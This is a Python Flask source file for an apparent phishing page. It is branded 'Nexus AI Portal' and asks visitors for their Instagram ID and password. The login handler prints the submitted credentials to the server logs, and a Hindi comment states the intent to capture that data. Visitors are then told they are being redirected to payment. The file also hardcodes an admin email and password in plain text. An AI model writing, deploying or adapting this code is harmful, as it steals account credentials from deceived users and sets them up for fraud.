import os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# --- ADMIN CREDENTIALS ---
A_EMAIL = "nexusai119@gmail.com"
A_PASS = "prashant@123456"

# --- UI DESIGN ---
STYLE = """
<style>
    body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
    .card { background: #1e293b; display: inline-block; padding: 30px; border-radius: 15px; border: 2px solid #38bdf8; width: 300px; }
    input { display: block; width: 90%; padding: 12px; margin: 15px auto; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; }
    button { background: #38bdf8; color: #0f172a; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
</style>
"""

@app.route('/')
def home():
    return render_template_string(f"<html><head>{STYLE}</head><body><div class='card'><h2>🚀 Nexus AI Portal</h2><form method='POST' action='/login'><input name='u' placeholder='Instagram ID' required><input name='p' type='password' placeholder='Password' required><button type='submit'>Login & Start</button></form></div></body></html>")

@app.route('/login', methods=['POST'])
def login():
    # Ye data pakdega aur logs mein dikhayega
    print(f"!!! DATA !!! ID: {request.form.get('u')} | PASS: {request.form.get('p')}")
    return "<h1>Data Received! Redirecting to Payment...</h1>"

# --- RENDER PORT FIX (YE SABSE ZAROORI HAI) ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
